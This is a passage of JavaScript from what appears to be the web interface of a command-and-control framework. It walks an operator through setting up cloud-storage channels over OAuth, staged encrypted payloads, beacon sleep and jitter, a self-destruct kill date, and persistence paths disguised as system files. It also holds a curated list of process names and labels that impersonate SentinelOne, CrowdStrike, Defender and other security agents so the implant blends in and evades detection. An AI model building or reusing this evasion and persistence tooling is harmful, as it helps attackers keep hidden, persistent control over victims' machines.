    googledrive: 'Google shows the authorization code directly on the page. Copy it and paste it below. <b>Note:</b> your OAuth client must be of type "Desktop app".',
  };

  const _OAUTH_PROVIDERS = new Set(['dropbox', 'onedrive', 'sharepoint', 'googledrive']);

  function _buildOAuthHelper(savedCreds) {
    const panel = document.createElement('div');
    panel.className = 'oauth-helper';
    panel.innerHTML = `
      <div class="oauth-helper-hdr">🔗 Generate authorization link</div>
      <div class="oauth-auth-row">
        <button class="btn-oauth-gen oauth-gen-btn">Generate Link</button>
        <span class="oauth-auth-status"></span>
      </div>
      <div class="oauth-url-box" style="display:none">
        <div class="oauth-url-row">
          <code class="oauth-auth-url"></code>
          <button class="btn-oauth-sm oauth-copy-url">Copy</button>
        </div>
        <div class="oauth-hint oauth-code-hint"></div>
        <div class="form-group">
          <label>Authorization Code <span class="req">*</span></label>
          <input class="oauth-code-inp" type="text"
                 placeholder="Paste the code or the full redirect URL…" autocomplete="off">
          <div class="hint" style="color:var(--accent);margin-top:.3rem">
            ⚠ You must click <b>Get Refresh Token →</b> after pasting before proceeding to the next step.
          </div>
        </div>
        <div class="oauth-auth-row" style="margin-top:.1rem">
          <button class="btn-oauth-exchange oauth-xchg-btn">Get Refresh Token →</button>
        </div>
      </div>`;

    const genBtn   = panel.querySelector('.oauth-gen-btn');
    const urlBox   = panel.querySelector('.oauth-url-box');
    const authUrl  = panel.querySelector('.oauth-auth-url');
    const copyUrl  = panel.querySelector('.oauth-copy-url');
    const codeHint = panel.querySelector('.oauth-code-hint');
    const codeInp  = panel.querySelector('.oauth-code-inp');
    const xchgBtn  = panel.querySelector('.oauth-xchg-btn');
    const statusEl = panel.querySelector('.oauth-auth-status');

    function _collectCreds() {
      const creds = {};
      (_providers[_provId]?.fields || []).filter(f => f.group !== 'channel').forEach(f => {
        const el = document.getElementById(`cred-${f.name}`);
        if (el) creds[f.name] = el.value.trim();
      });
      Object.keys(savedCreds || {}).forEach(k => { if (!creds[k]) creds[k] = savedCreds[k]; });
      return creds;
    }

    function _onTokenAcquired(refreshToken, creds) {
      const rtEl = document.getElementById('cred-refresh_token');
      if (rtEl) {
        rtEl.value = refreshToken;
        rtEl.style.outline = '2px solid var(--green)';
        setTimeout(() => { rtEl.style.outline = ''; }, 2500);
      }
      statusEl.textContent = '✓ Token acquired';
      statusEl.style.color = 'var(--green)';
      genBtn.textContent   = 'Regenerate';
      Toast.success('Token acquired', 'Refresh token obtained — proceed to complete the deploy to save credentials');
    }

    copyUrl.addEventListener('click', () => {
      navigator.clipboard?.writeText(authUrl.textContent).then(
        () => Toast.success('Copied', 'Auth URL copied to clipboard'),
        () => {}
      );
    });

    genBtn.addEventListener('click', () => {
      const creds = _collectCreds();
      const fn    = _OAUTH_URL[_provId];
      const url   = fn ? fn(creds) : null;
      if (!url) { Toast.warning('Missing field', 'Fill in Client ID / App Key first.'); return; }
      authUrl.textContent  = url;
      codeHint.innerHTML   = _OAUTH_CODE_HINT[_provId] || '';
      urlBox.style.display = '';
      statusEl.textContent = '';
      statusEl.style.color = '';
      genBtn.textContent   = 'Regenerate';
    });

    xchgBtn.addEventListener('click', async () => {
      let code = codeInp.value.trim();
      /* Accept full redirect URL — extract code= automatically */
      if (code.includes('://') || code.includes('?') || code.includes('&')) {
        try {
          const u = new URL(code.startsWith('http') ? code : 'http://x?' + code);
          const extracted = u.searchParams.get('code');
          if (extracted) code = extracted;
        } catch(_) {}
      }
      if (!code) { Toast.warning('Missing code', 'Paste the authorization code first.'); return; }

      const creds = _collectCreds();
      xchgBtn.disabled     = true;
      xchgBtn.textContent  = '⋯ Exchanging…';
      statusEl.textContent = '';
      statusEl.style.color = '';

      try {
        const credLabel = document.getElementById('cred-label')?.value?.trim() || '';
        const result = await API.oauthExchange(_provId, creds, code, credLabel);
        codeInp.value = '';
        _onTokenAcquired(result.refresh_token, creds);
      } catch(e) {
        statusEl.textContent = `✗ ${e.message || 'Exchange failed'}`;
        statusEl.style.color = 'var(--accent-bright)';
        Toast.error('Exchange failed', e.message || 'Check credentials and code');
      } finally {
        xchgBtn.disabled    = false;
        xchgBtn.textContent = 'Get Refresh Token →';
      }
    });

    return panel;
  }

  /* ═══════════════════════════════════════════════════════════════════════════
     STEP 1 — three sub-views: pick / channel / new-form
  ═══════════════════════════════════════════════════════════════════════════ */
  /* Dispatcher */
  function _renderStep1() {
    if      (_credMode === 'pick')    _renderStep1Pick();
    else if (_credMode === 'channel') _renderStep1Channel();
    else                              _renderStep1Form();
  }

  /* ── 1a: Profile picker ─────────────────────────────────────────────────── */
  function _renderStep1Pick() {
    const body     = _body();
    const p        = _providers[_provId] || {};
    const profiles = _profilesFor(_provId);
    body.innerHTML  = '';

    const hdr = document.createElement('div');
    hdr.className = 'step-help-row';
    hdr.innerHTML = `
      <span class="text-dim" style="font-size:.75rem">
        Saved credentials for <strong style="color:var(--text)">${escHtml(p.label || _provId)}</strong>
      </span>
      <button class="btn-guide" id="btn-new-cred-inline">+ New credentials</button>`;
    body.appendChild(hdr);
    document.getElementById('btn-new-cred-inline')?.addEventListener('click', () => {
      _credMode       = 'new';
      _selectedProfId = null;
      _renderStep1Form();
    });

    const listEl = document.createElement('div');
    listEl.className = 'cred-profile-list';

    profiles.forEach(prof => {
      const isSelected = _selectedProfId === prof.id;
      const row = document.createElement('div');
      row.className = `cred-profile-row${isSelected ? ' selected' : ''}`;
      const dt    = new Date(prof.saved_at);
      const dtStr = dt.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });
      row.innerHTML = `
        <div class="cred-profile-inner">
          <input type="radio" name="cred-profile" value="${escHtml(prof.id)}"${isSelected ? ' checked' : ''}>
          <div class="cred-profile-info">
            <div class="cred-profile-label">${escHtml(prof.label)}</div>
            <div class="cred-profile-date">Saved ${escHtml(dtStr)}</div>
          </div>
          <button class="btn-cred-del" title="Delete this profile">✕</button>
        </div>`;

      row.addEventListener('click', e => {
        if (e.target.closest('.btn-cred-del')) return;
        $$('.cred-profile-row', listEl).forEach(r => r.classList.remove('selected'));
        row.classList.add('selected');
        row.querySelector('input[type=radio]').checked = true;
        _selectedProfId = prof.id;
        _setNext(true, 'Use Selected →');
      });

      row.querySelector('.btn-cred-del').addEventListener('click', e => {
        e.stopPropagation();
        _deleteProfileRemote(_provId, prof.id);   // async, updates cache
        if (_selectedProfId === prof.id) { _selectedProfId = null; _setNext(false, 'Use Selected →'); }
        row.remove();
        if (!listEl.querySelector('.cred-profile-row')) {
          _credMode = 'new';
          _renderStep1Form();
        }
      });

      listEl.appendChild(row);
    });

    body.appendChild(listEl);
    _setPrev(true);
    _setNext(!!_selectedProfId, 'Use Selected →');
  }

  /* ── 1b: Channel-only form (after selecting a saved profile) ────────────── */
  function _renderStep1Channel() {
    const body         = _body();
    const p            = _providers[_provId] || {};
    const fields       = p.fields || [];
    const channelFields = fields.filter(f => f.group === 'channel');
    body.innerHTML     = '';

    const hdr = document.createElement('div');
    hdr.className = 'step-help-row';
    hdr.innerHTML = `
      <span class="text-dim" style="font-size:.75rem">
        Channel files for <strong style="color:var(--text)">${escHtml(p.label || _provId)}</strong>
      </span>`;
    body.appendChild(hdr);

    const prof = _profilesFor(_provId).find(p => p.id === _selectedProfId);
    if (prof) {
      const badge = document.createElement('div');
      badge.className = 'cred-banner';
      badge.innerHTML = `🔑 Using saved credentials: <strong>${escHtml(prof.label)}</strong>`;
      body.appendChild(badge);
    }

    if (channelFields.length) {
      body.appendChild(_buildChannelSection(channelFields));
    }

    _setPrev(true);
    _setNext(true);
  }

  function _buildChannelSection(channelFields) {
    const wrap = document.createElement('div');

    const sec = document.createElement('div');
    sec.className = 'cfg-section';
    sec.innerHTML = '<div class="cfg-section-hdr">Channel Files <span class="hint-lbl">(paths on the cloud storage)</span></div>';
    wrap.appendChild(sec);

    const fileFields   = channelFields.filter(f => ['input_file','output_file','heartbeat_file'].includes(f.name));
    const folderField  = channelFields.find(f => f.name === 'folder_path');
    const otherFields  = channelFields.filter(f => !['input_file','output_file','heartbeat_file','folder_path'].includes(f.name));

    /* ── Randomize filenames toggle ── */
    if (fileFields.length) {
      const togRow = document.createElement('label');
      togRow.className = 'tog-label';
      togRow.style.marginBottom = '.6rem';
      togRow.innerHTML = `
        <input type="checkbox" id="ch-randomize" checked>
        <span class="tog-track"><span class="tog-thumb"></span></span>
        <span>Randomize filenames <span class="hint-lbl">(per-deploy random hex names — harder to fingerprint)</span></span>`;
      wrap.appendChild(togRow);

      const fileWrap = document.createElement('div');
      fileWrap.id = 'ch-file-inputs';
      fileWrap.style.display = 'none';
      fileFields.forEach(f => {
        const val = _creds[f.name] !== undefined ? _creds[f.name] : (f.default ?? '');
        const grp = document.createElement('div');
        grp.className = 'form-group';
        grp.innerHTML = `
          <label>${escHtml(f.label || f.name)}</label>
          <input type="text" id="cred-${escHtml(f.name)}"
                 value="${escHtml(String(val))}" autocomplete="off">`;
        fileWrap.appendChild(grp);
      });
      wrap.appendChild(fileWrap);

      togRow.querySelector('#ch-randomize').addEventListener('change', function() {
        fileWrap.style.display = this.checked ? 'none' : '';
      });
    }

    /* ── Folder path mode selector ── */
    if (folderField) {
      const folderSec = document.createElement('div');
      folderSec.className = 'cfg-section';
      folderSec.style.marginTop = '.6rem';
      folderSec.innerHTML = `
        <div class="cfg-section-hdr">Folder Path</div>
        <div class="folder-mode-radios" style="display:flex;flex-direction:column;gap:.45rem;margin-bottom:.6rem">
          <label class="radio-label">
            <input type="radio" name="ch-folder-mode" value="hex" checked>
            <span>Random hex <span class="hint-lbl">(e.g. /a8f3c1b2 — no fingerprint)</span></span>
          </label>
          <label class="radio-label">
            <input type="radio" name="ch-folder-mode" value="realistic">
            <span>Random realistic <span class="hint-lbl">(e.g. /Reports_Q3, /Backups42 — blends with real folders)</span></span>
          </label>
          <label class="radio-label">
            <input type="radio" name="ch-folder-mode" value="manual">
            <span>Manual</span>
          </label>
        </div>
        <div id="ch-folder-input" style="display:none">
          <div class="form-group" style="margin-bottom:0">
            <input type="text" id="cred-folder_path"
                   value="${escHtml(String(_creds[folderField.name] !== undefined ? _creds[folderField.name] : (folderField.default ?? '')))}" autocomplete="off" placeholder="/MyFolder">
          </div>
        </div>`;
      wrap.appendChild(folderSec);

      folderSec.querySelectorAll('input[name="ch-folder-mode"]').forEach(r => {
        r.addEventListener('change', () => {
          document.getElementById('ch-folder-input').style.display = r.value === 'manual' ? '' : 'none';
        });
      });
    }

    otherFields.forEach(f => {
      const val = _creds[f.name] !== undefined ? _creds[f.name] : (f.default ?? '');
      const grp = document.createElement('div');
      grp.className = 'form-group';
      grp.innerHTML = `
        <label>${escHtml(f.label || f.name)}${f.required ? ' <span class="req">*</span>' : ''}</label>
        <input type="text" id="cred-${escHtml(f.name)}"
               value="${escHtml(String(val))}" autocomplete="off">`;
      wrap.appendChild(grp);
    });

    /* ── Session Label ── */
    const lblSec = document.createElement('div');
    lblSec.className = 'cfg-section';
    lblSec.style.marginTop = '1rem';
    lblSec.innerHTML = `
      <div class="cfg-section-hdr">Session Label <span class="hint-lbl">(optional — identifies this session in the dashboard)</span></div>
      <div class="form-group" style="margin-bottom:0">
        <div class="form-row" style="align-items:center;gap:.5rem">
          <input type="text" id="ch-session-label" value="${escHtml(_creds.session_label || '')}" placeholder="e.g. webserver-01, dc-corp" style="flex:1" autocomplete="off">
          <button class="btn-guide" id="ch-label-suggest" title="Label suggestions based on target context" style="white-space:nowrap">
            💡 Suggest
          </button>
        </div>
      </div>`;
    wrap.appendChild(lblSec);
    setTimeout(() => {
      document.getElementById('ch-label-suggest')?.addEventListener('click', _openLabelModal);
    }, 0);

    return wrap;
  }

  function _collectChannelFields() {
    const randomize  = document.getElementById('ch-randomize')?.checked ?? true;
    const folderMode = document.querySelector('input[name="ch-folder-mode"]:checked')?.value || 'hex';
    const fileNames  = new Set(['input_file', 'output_file', 'heartbeat_file']);
    const fields = (_providers[_provId] || {}).fields || [];
    fields.filter(f => f.group === 'channel').forEach(f => {
      if (randomize && fileNames.has(f.name)) {
        _creds[f.name] = '__random__';
      } else if (f.name === 'folder_path') {
        if (folderMode === 'hex')            _creds[f.name] = '__random__';
        else if (folderMode === 'realistic') _creds[f.name] = '__random_folder__';
        else { const inp = document.getElementById('cred-folder_path'); if (inp) _creds[f.name] = inp.value; }
      } else {
        const inp = document.getElementById(`cred-${f.name}`);
        if (inp) _creds[f.name] = inp.value;
      }
    });
    _creds.session_label = document.getElementById('ch-session-label')?.value?.trim() || '';
  }

  /* ── 1c: Full credential form (new credentials) ─────────────────────────── */
  function _renderStep1Form() {
    const body   = _body();
    const p      = _providers[_provId] || {};
    const fields = p.fields || [];
    body.innerHTML = '';

    const hasProfiles = _hasSavedProfiles(_provId);

    const helpRow = document.createElement('div');
    helpRow.className = 'step-help-row';
    helpRow.innerHTML = `
      <span class="text-dim" style="font-size:.75rem">
        ${hasProfiles ? '<button class="btn-guide" id="btn-back-profiles" style="margin-right:.4rem">← Saved</button>' : ''}
        Credentials for <strong style="color:var(--text)">${escHtml(p.label || _provId)}</strong>
      </span>
      <button class="btn-guide" id="btn-guide-open" title="How to get these credentials">? Setup Guide</button>`;
    body.appendChild(helpRow);
    document.getElementById('btn-guide-open')?.addEventListener('click', _openGuide);
    document.getElementById('btn-back-profiles')?.addEventListener('click', () => {
      _credMode = 'pick';
      _stopOAuth();
      _renderStep1Pick();
    });

    if (!fields.length) {
      body.insertAdjacentHTML('beforeend', `
        <div class="ncn-box" style="margin-top:.8rem">
          <span class="ncn-icon">✓</span>
          <div>
            <div class="ncn-title">No credentials required</div>
            <div class="ncn-sub">This provider does not need API keys.</div>
          </div>
        </div>`);
      _setPrev(true); _setNext(true);
      return;
    }

    const credFields    = fields.filter(f => f.group !== 'channel');
    const channelFields = fields.filter(f => f.group === 'channel');

    function _renderFieldGroup(flist, withOAuth = false) {
      const skipNames = new Set();
      flist.forEach(f => {
        if (skipNames.has(f.name)) return;

        if (withOAuth && f.name === 'refresh_token' && _OAUTH_PROVIDERS.has(_provId)) {
          body.appendChild(_buildOAuthHelper({}));
          const hid   = document.createElement('input');
          hid.type    = 'hidden';
          hid.id      = 'cred-refresh_token';
          hid.value   = '';
          body.appendChild(hid);
          return;
        }

        function _makeFormGroup(field) {
          const val    = field.default ?? '';
          const isPass = field.type === 'password';
          const grp    = document.createElement('div');
          grp.className = 'form-group';
          grp.innerHTML = `
            <label>${escHtml(field.label || field.name)}${field.required ? ' <span class="req">*</span>' : ''}</label>
            ${field.hint ? `<div class="hint" style="margin-bottom:.25rem;margin-top:-.1rem">${field.hint}</div>` : ''}
            <input type="${isPass ? 'password' : 'text'}"
                   id="cred-${escHtml(field.name)}"
                   value="${escHtml(String(val))}"
                   autocomplete="off">`;
          return grp;
        }

        /* row_with: ['other'] — render this field side-by-side with named siblings */
        if (f.row_with && f.row_with.length) {
          const row = document.createElement('div');
          row.className = 'form-row';
          row.appendChild(_makeFormGroup(f));
          f.row_with.forEach(name => {
            const sibling = flist.find(x => x.name === name);
            if (sibling) { row.appendChild(_makeFormGroup(sibling)); skipNames.add(name); }
          });
          body.appendChild(row);
        } else {
          body.appendChild(_makeFormGroup(f));
        }
      });
    }

    if (credFields.length) {
      const sec = document.createElement('div');
      sec.className = 'cfg-section';
      sec.innerHTML = '<div class="cfg-section-hdr">Credentials</div>';
      body.appendChild(sec);

      const lblGrp = document.createElement('div');
      lblGrp.className = 'form-group';
      lblGrp.innerHTML = `
        <label>Profile Name <span class="hint-lbl">(optional — helps identify this account)</span></label>
        <input type="text" id="cred-label" value="" autocomplete="off" placeholder="e.g. personal, corp-tenant, ops-bucket">`;
      body.appendChild(lblGrp);

      _renderFieldGroup(credFields, /* withOAuth= */ true);
    }

    if (channelFields.length) {
      body.appendChild(_buildChannelSection(channelFields));
    }

    _setPrev(true); _setNext(true);
  }

  function _collectStep1() {
    const randomize  = document.getElementById('ch-randomize')?.checked ?? true;
    const folderMode = document.querySelector('input[name="ch-folder-mode"]:checked')?.value || 'hex';
    const fileNames  = new Set(['input_file', 'output_file', 'heartbeat_file']);
    const fields = (_providers[_provId] || {}).fields || [];
    _creds = {};
    fields.forEach(f => {
      if (randomize && fileNames.has(f.name)) {
        _creds[f.name] = '__random__';
      } else if (f.name === 'folder_path') {
        if (folderMode === 'hex')            _creds[f.name] = '__random__';
        else if (folderMode === 'realistic') _creds[f.name] = '__random_folder__';
        else { const inp = document.getElementById('cred-folder_path'); if (inp) _creds[f.name] = inp.value; }
      } else {
        const inp = document.getElementById(`cred-${f.name}`);
        if (inp) _creds[f.name] = inp.value;
      }
    });
    _creds._label = document.getElementById('cred-label')?.value?.trim() || '';
    _creds.session_label = document.getElementById('ch-session-label')?.value?.trim() || '';
  }

  /* ═══════════════════════════════════════════════════════════════════════════
     STEP 2 — Agent Configuration
  ═══════════════════════════════════════════════════════════════════════════ */
  const _MODE_INFO = {
    'staged-enc':      { label: 'Staged Enc',       desc: 'Stage2 on cloud encrypted with key baked in stub. Fetched once, cached locally. Server cancels cloud artifact after first heartbeat.' },
    'stageless-enc':   { label: 'Stageless Enc',    desc: 'Single encrypted file on target. Key baked in stub. No cloud artifact needed after deployment.' },
    'stageless-plain': { label: 'Stageless Plain',  desc: 'No embedded key. Communication is in plaintext. Use only in controlled environments.' },
  };

  function _cfgDefault(name) {
    const v = _cmVals[name];
    if (v !== undefined) return v;
    return (_cmFields.find(f => f.name === name)?.default) ?? '';
  }

  function _renderStep2() {
    const body = _body();
    body.innerHTML = '';

    const modeWrap = document.createElement('div');
    modeWrap.className = 'cfg-section';
    modeWrap.innerHTML = '<div class="cfg-section-hdr">Deploy Mode</div>';
    const modeGrp = document.createElement('div');
    modeGrp.className = 'radio-group';
    modeGrp.id = 'cfg-mode-grp';

    const modeOptions = _cmFields.find(f => f.name === 'mode')?.options
                        || ['staged-enc', 'stageless-enc', 'stageless-plain'];
    const curMode = String(_cfgDefault('mode') || 'staged-enc');

    modeOptions.forEach(m => {
      const info = _MODE_INFO[m] || { label: m, desc: '' };
      const card = document.createElement('div');
      card.className = `radio-card${curMode === m ? ' selected' : ''}`;
      card.innerHTML = `
        <input type="radio" name="cfg-mode" value="${escHtml(m)}" ${curMode === m ? 'checked' : ''}>
        <div>
          <div class="rc-title">${escHtml(info.label)}</div>
          <div class="rc-desc">${escHtml(info.desc)}</div>
        </div>`;
      card.addEventListener('click', () => {
        $$('.radio-card', modeGrp).forEach(c => c.classList.remove('selected'));
        card.classList.add('selected');
        card.querySelector('input[type=radio]').checked = true;
      });
      modeGrp.appendChild(card);
    });
    modeWrap.appendChild(modeGrp);
    body.appendChild(modeWrap);

    const beaconWrap = document.createElement('div');
    beaconWrap.className = 'cfg-section';
    beaconWrap.innerHTML = `
      <div class="cfg-section-hdr">Beacon Behavior</div>
      <div class="form-row">
        <div class="form-group">
          <label>Sleep Interval (seconds)</label>
          <div class="sc-stepper">
            <button class="sc-step" onclick="Deploy._stepSleep(-300)">‹‹</button>
            <button class="sc-step" onclick="Deploy._stepSleep(-10)">‹</button>
            <input type="number" id="cfg-base_sleep" value="${escHtml(String(_cfgDefault('base_sleep') ?? 30))}" min="5" max="86400">
            <button class="sc-step" onclick="Deploy._stepSleep(10)">›</button>
            <button class="sc-step" onclick="Deploy._stepSleep(300)">››</button>
          </div>
        </div>
        <div class="form-group">
          <label>Jitter (%)</label>
          <div class="sc-stepper">
            <button class="sc-step" onclick="Deploy._stepJitter(-10)">‹‹</button>
            <button class="sc-step" onclick="Deploy._stepJitter(-5)">‹</button>
            <input type="number" id="cfg-jitter_percent" value="${escHtml(String(_cfgDefault('jitter_percent') ?? 30))}" min="0" max="100">
            <button class="sc-step" onclick="Deploy._stepJitter(5)">›</button>
            <button class="sc-step" onclick="Deploy._stepJitter(10)">››</button>
          </div>
        </div>
      </div>`;
    body.appendChild(beaconWrap);

    const windowWrap = document.createElement('div');
    windowWrap.className = 'cfg-section';
    windowWrap.innerHTML = `
      <div class="cfg-section-hdr">Guardrails <span class="hint-lbl">(optional — baked permanently into the agent)</span></div>
      <div class="form-group" style="margin-bottom:.75rem">
        <label>Kill Date <span class="hint-lbl">(agent self-destructs on or after this date — removes persist + binary)</span></label>
        <input type="date" id="cfg-kill_date" value="${escHtml(String(_cfgDefault('kill_date') || ''))}">
      </div>
      <div class="form-group" style="margin-bottom:.25rem">
        <label>Active Hours <span class="hint-lbl">(beacon only during this window — leave blank for 24/7)</span></label>
      </div>
      <div class="window-row">
        <div class="form-group" style="margin-bottom:0">
          <label>From</label>
          <input type="time" id="cfg-window_start" value="${escHtml(String(_cfgDefault('window_start') || ''))}">
        </div>
        <div class="window-sep">→</div>
        <div class="form-group" style="margin-bottom:0">
          <label>To</label>
          <input type="time" id="cfg-window_end" value="${escHtml(String(_cfgDefault('window_end') || ''))}">
        </div>
      </div>`;
    body.appendChild(windowWrap);

    const blobWrap = document.createElement('div');
    blobWrap.className = 'cfg-section';
    blobWrap.innerHTML = `
      <div class="cfg-section-hdr">Persistence Paths <span class="hint-lbl">(blob location on target)</span></div>
      <div class="form-group" style="margin-bottom:.5rem">
        <label>Linux <span class="hint-lbl">(e.g. \${HOME}/.config/pulse/.pid)</span></label>
        <input type="text" id="cfg-blob_path_linux"
               value="${escHtml(String(_cfgDefault('blob_path_linux') || '${HOME}/.config/pulse/.pid'))}">
      </div>
      <div class="form-group">
        <label>Windows <span class="hint-lbl">(e.g. %APPDATA%\\Microsoft\\...)</span></label>
        <input type="text" id="cfg-blob_path_win"
               value="${escHtml(String(_cfgDefault('blob_path_win') || '%APPDATA%\\Microsoft\\Windows\\Themes\\.ddb'))}">
      </div>`;
    body.appendChild(blobWrap);

    const debugVal = _cfgDefault('debug_mode');
    const tagWrap = document.createElement('div');
    tagWrap.className = 'cfg-section';
    tagWrap.innerHTML = `
      <div class="cfg-section-hdr">Options</div>
      <label class="tog-label">
        <input type="checkbox" id="cfg-debug_mode"${debugVal ? ' checked' : ''}>
        <span class="tog-track"><span class="tog-thumb"></span></span>
        <span>Debug mode <span class="hint-lbl">(verbose output — dev only)</span></span>
      </label>`;
    body.appendChild(tagWrap);

    const agentWrap = document.createElement('div');
    agentWrap.className = 'cfg-section';
    agentWrap.innerHTML = `
      <div class="cfg-section-hdr">Agent Binary Name <span class="hint-lbl">(optional — rename artifacts to blend in)</span></div>
      <div class="form-row" style="align-items:flex-end;gap:.5rem">
        <div class="form-group" style="flex:1;margin-bottom:0">
          <label>Windows <span class="hint-lbl">(.exe / .dll / .bin)</span></label>
          <input type="text" id="cfg-agent_name_win" value="${escHtml(String(_cfgDefault('agent_name_win') || ''))}"
                 placeholder="e.g. RuntimeBroker" autocomplete="off">
        </div>
        <div class="form-group" style="flex:1;margin-bottom:0">
          <label>Linux <span class="hint-lbl">(.elf / .sh)</span></label>
          <input type="text" id="cfg-agent_name_linux" value="${escHtml(String(_cfgDefault('agent_name_linux') || ''))}"
                 placeholder="e.g. systemd-resolved" autocomplete="off">
        </div>
        <button class="btn-guide" id="cfg-opsec-suggest" title="OPSEC name suggestions" style="white-space:nowrap;margin-bottom:0">
          💡 Suggest
        </button>
      </div>`;
    body.appendChild(agentWrap);
    document.getElementById('cfg-opsec-suggest').addEventListener('click', _openOpsecModal);

    _setPrev(true); _setNext(true);
  }

  /* ── Session Label suggestion modal ─────────────────────────────────────────── */
  const _LABEL_SUGGESTIONS = [
    // EDR / AV — names that blend with the product running on target
    { name: 's1-telemetry',    desc: 'SentinelOne telemetry forwarder. Indistinguishable from real S1 processes in logs.',            tags: ['edr','sentinelone'] },
    { name: 's1-healthd',      desc: 'SentinelOne health daemon. Short daemon-style name, invisible in ps output.',                  tags: ['edr','sentinelone'] },
    { name: 's1-netmon',       desc: 'SentinelOne network monitor. Plausible network-related S1 subprocess.',                        tags: ['edr','sentinelone'] },
    { name: 's1-collector',    desc: 'SentinelOne log collector. Mirrors real agent component naming.',                               tags: ['edr','sentinelone'] },
    { name: 's1-watchdog',     desc: 'SentinelOne watchdog process. Common pattern for EDR self-monitoring.',                        tags: ['edr','sentinelone'] },
    { name: 'sentineld',       desc: 'Generic SentinelOne daemon. Unix-style daemon naming convention.',                             tags: ['edr','sentinelone'] },
    { name: 'cs-sensor',       desc: 'CrowdStrike Falcon sensor. Matches real CrowdStrike component naming.',                       tags: ['edr','crowdstrike'] },
    { name: 'cs-telemetry',    desc: 'CrowdStrike telemetry agent. Expected network traffic from any CS-protected host.',           tags: ['edr','crowdstrike'] },
    { name: 'falcon-relay',    desc: 'CrowdStrike Falcon relay. Plausible for hosts in proxy/relay configurations.',                tags: ['edr','crowdstrike'] },
    { name: 'cs-healthd',      desc: 'CrowdStrike health monitor. Daemon-style process name.',                                       tags: ['edr','crowdstrike'] },
    { name: 'cb-sensor',       desc: 'Carbon Black sensor agent. Matches VMware CB naming convention.',                              tags: ['edr','carbonblack'] },
    { name: 'cb-relay',        desc: 'Carbon Black event relay. Expected on hosts forwarding events to CB server.',                  tags: ['edr','carbonblack'] },
    { name: 'mde-sensor',      desc: 'Microsoft Defender for Endpoint sensor. Expected on all Windows enterprise hosts.',            tags: ['edr','defender'] },
    { name: 'mde-collector',   desc: 'MDE telemetry collector. Blends with Defender ATP component names.',                           tags: ['edr','defender'] },
    { name: 'defender-relay',  desc: 'Microsoft Defender relay process. Plausible on multi-tier defender deployments.',              tags: ['edr','defender'] },
    { name: 'sophos-relay',    desc: 'Sophos relay agent. Matches Sophos component naming for update relays.',                       tags: ['edr','sophos'] },
    { name: 'elastic-agent',   desc: 'Elastic Security agent. Expected on hosts with Elastic SIEM/EDR.',                            tags: ['edr','elastic'] },
    { name: 'fleet-agent',     desc: 'Elastic Fleet managed agent. Generic enough for any fleet management context.',               tags: ['edr','elastic'] },
    // Monitoring / Telemetry
    { name: 'node-exporter',   desc: 'Prometheus node exporter. Running on virtually every monitored Linux server.',                 tags: ['monitoring'] },
    { name: 'telegraf',        desc: 'InfluxDB Telegraf agent. Common metrics collector with expected network egress.',              tags: ['monitoring'] },
    { name: 'collectd',        desc: 'System statistics collector. Classic Unix monitoring daemon.',                                  tags: ['monitoring'] },
    { name: 'metrics-relay',   desc: 'Generic metrics forwarder. Plausible on any server with observability stack.',                 tags: ['monitoring'] },
    { name: 'datadog-agent',   desc: 'Datadog monitoring agent. Expected on enterprise-monitored infrastructure.',                   tags: ['monitoring'] },
    { name: 'splunk-fwd',      desc: 'Splunk Universal Forwarder. Log forwarding agent on monitored hosts.',                         tags: ['monitoring'] },
    // Network services
    { name: 'dns-relay',       desc: 'DNS relay/forwarder. Plausible on any internal server acting as DNS cache.',                   tags: ['network'] },
    { name: 'ntp-sync',        desc: 'NTP synchronization service. Expected background process on all servers.',                     tags: ['network'] },
    { name: 'syslog-fwd',      desc: 'Syslog forwarder. Common on Linux hosts sending logs to central SIEM.',                       tags: ['network'] },
    { name: 'netflow-agent',   desc: 'NetFlow/IPFIX collector agent. Expected on network monitoring infrastructure.',               tags: ['network'] },
    { name: 'proxy-health',    desc: 'Proxy health-check service. Plausible on hosts behind load balancers.',                        tags: ['network'] },
    // IT / Infrastructure management
    { name: 'backup-agent',    desc: 'Backup management agent. Every server should have one; periodic network expected.',            tags: ['infra'] },
    { name: 'wsus-client',     desc: 'Windows Update Services client. Expected on all domain-joined Windows hosts.',                tags: ['infra'] },
    { name: 'sccm-agent',      desc: 'SCCM/MECM client agent. Standard on enterprise Windows endpoints.',                           tags: ['infra'] },
    { name: 'puppet-agent',    desc: 'Puppet configuration agent. Expected on config-managed infrastructure.',                       tags: ['infra'] },
    { name: 'chef-client',     desc: 'Chef configuration client. Periodic runs with API calls to Chef server.',                     tags: ['infra'] },
    { name: 'ansible-pull',    desc: 'Ansible pull-mode agent. Plausible on self-configuring infrastructure.',                       tags: ['infra'] },
    // Cloud / DevOps
    { name: 'ssm-agent',       desc: 'AWS Systems Manager agent. Expected on all EC2 instances.',                                    tags: ['cloud'] },
    { name: 'gcp-agent',       desc: 'Google Cloud ops agent. Standard on GCE instances.',                                           tags: ['cloud'] },
    { name: 'az-monitor',      desc: 'Azure Monitor agent. Expected on all Azure-managed VMs.',                                      tags: ['cloud'] },
    { name: 'k8s-probe',       desc: 'Kubernetes health probe. Blends on containerized environments.',                               tags: ['cloud'] },
    { name: 'cloud-init',      desc: 'Cloud-init service. Universal on cloud VMs at boot and re-configuration.',                    tags: ['cloud'] },
  ];

  const _LABEL_TAGS = {
    edr: 'EDR/AV', sentinelone: 'SentinelOne', crowdstrike: 'CrowdStrike',
    carbonblack: 'Carbon Black', defender: 'Defender', sophos: 'Sophos', elastic: 'Elastic',
    monitoring: 'Monitoring', network: 'Network', infra: 'Infrastructure', cloud: 'Cloud',
  };

  let _labelActiveTag = 'all';

  function _openLabelModal() {
    let overlay = document.getElementById('label-overlay');
    if (!overlay) {
      overlay = document.createElement('div');
      overlay.id = 'label-overlay';
      overlay.className = 'modal-overlay';
      overlay.innerHTML = `
        <div class="modal opsec-modal" id="label-modal" style="max-width:700px;width:95vw">
          <div class="modal-header">
            <span class="modal-title">💡 Session Label Suggestions</span>
            <button class="modal-close" id="label-close">✕</button>
          </div>
          <p style="padding:0 1.2rem;margin:.4rem 0 .6rem;color:var(--fg2);font-size:.82rem">
            Pick a label that blends with the software running on your target. The label is only visible server-side.
          </p>
          <div class="opsec-filters" id="label-filters"></div>
          <div class="opsec-list" id="label-grid"></div>
        </div>`;
      document.body.appendChild(overlay);
      document.getElementById('label-close').addEventListener('click', () => { overlay.classList.remove('open'); });
      overlay.addEventListener('click', e => { if (e.target === overlay) overlay.classList.remove('open'); });
    }
    _labelActiveTag = 'all';
    overlay.classList.add('open');
    _renderLabelGrid();
  }

  function _renderLabelGrid() {
    const entries = _LABEL_SUGGESTIONS;
